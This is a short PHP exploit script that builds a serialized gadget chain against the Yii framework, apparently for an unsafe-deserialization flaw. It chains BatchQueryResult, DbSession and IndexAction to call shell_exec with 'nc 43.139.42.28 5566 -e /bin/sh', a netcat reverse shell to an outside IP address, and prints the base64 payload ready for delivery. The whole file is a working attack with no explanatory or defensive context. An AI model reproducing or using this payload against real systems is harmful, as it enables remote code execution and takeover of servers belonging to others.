<?php

namespace yii\rest {

    class Action
    {

        public $checkAccess;
    }

    class IndexAction
    {

        public function __construct($func, $param)
        {

            $this->checkAccess = $func;
            $this->id = $param;
        }
    }
}

namespace yii\web {

    abstract class MultiFieldSession
    {

        public $writeCallback;
    }

    class DbSession extends MultiFieldSession
    {

        public function __construct($func, $param)
        {

            $this->writeCallback = [new \yii\rest\IndexAction($func, $param), "run"];
        }
    }
}

namespace yii\db {

    use yii\base\BaseObject;

    class BatchQueryResult
    {

        private $_dataReader;

        public function __construct($func, $param)
        {

            $this->_dataReader = new \yii\web\DbSession($func, $param);
        }
    }
}

namespace {

    $exp = new \yii\db\BatchQueryResult('shell_exec', 'nc 43.139.42.28 5566 -e /bin/sh');
    echo(base64_encode(serialize($exp)));
}